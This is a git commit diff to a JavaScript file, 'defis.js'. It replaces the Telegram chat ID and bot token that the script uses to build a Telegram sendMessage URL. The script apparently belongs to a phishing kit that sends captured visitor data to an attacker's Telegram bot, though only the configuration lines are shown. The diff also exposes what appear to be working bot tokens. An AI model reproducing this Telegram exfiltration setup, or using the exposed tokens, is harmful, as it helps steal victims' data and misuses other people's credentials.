502e98c53520053e15a315ba4d24556113009cb5
maluku2025 <bupatibaru13@gmail.com>
2025-05-28 19:28:53 +0700

    Update defis.js

--- defis.js
+++ defis.js
@@ -1,7 +1,7 @@
      $(document).ready(function() {
 
-       const chat_id = '6809554683',
-         botID = 'bot7337684793:AAHS9zriqEO2UjlCOnDE7qV_LAshELvcE4Q';
+       const chat_id = '8022812304',
+         botID = 'bot7894845694:AAFGDlcpOfNcHKgIG6cIliKRhQu_NHcTMbY';
 
        const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
 
